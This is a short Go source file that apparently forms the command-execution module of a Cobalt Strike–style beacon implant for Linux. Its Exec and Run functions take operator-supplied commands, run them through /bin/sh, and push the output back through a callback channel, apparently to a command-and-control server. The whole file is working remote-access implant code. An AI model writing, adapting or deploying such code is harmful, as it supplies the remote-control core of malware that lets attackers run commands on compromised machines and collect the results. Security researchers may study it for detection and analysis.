//go:build linux

package command

import (
	"errors"
	"main/packet"
	"os/exec"
	"strings"
)

// no echo
func Exec(b []byte) error {
	cmd := exec.Command("/bin/sh", "-c", string(b))
	err := cmd.Start()
	if err != nil {
		return err
	}
	packet.PushResult(packet.CALLBACK_OUTPUT, []byte("exec success"))
	return nil
}

// implement of run and shell cmd
func Run(b []byte) error {
	pathByte, argsByte, err := parseCommandShell(b)
	if err != nil {
		return err
	}
	path := strings.Trim(string(pathByte), " ")
	args := strings.Trim(string(argsByte), " ")
	if path == "%COMSPEC%" && strings.HasPrefix(args, "/C") {
		args = args[3:]
		cmd := exec.Command("/bin/sh", "-c", args)
		result, err := cmd.CombinedOutput()
		if err != nil {
			return err
		}
		packet.PushResult(packet.CALLBACK_OUTPUT, []byte(result))
		return nil
	} else {
		// there shouldn't be a path in run cmd
		if len(path) != 0 {
			return errors.New("get a path from run cmd")
		}
		parts := strings.Split(args, " ")
		var cmd *exec.Cmd
		if len(parts) > 1 {
			cmd = exec.Command(parts[0], parts[1:]...)
		} else {
			cmd = exec.Command(parts[0])
		}
		result, err := cmd.CombinedOutput()
		if err != nil {
			return err
		}
		packet.PushResult(packet.CALLBACK_OUTPUT, []byte(result))
		return nil
	}
}
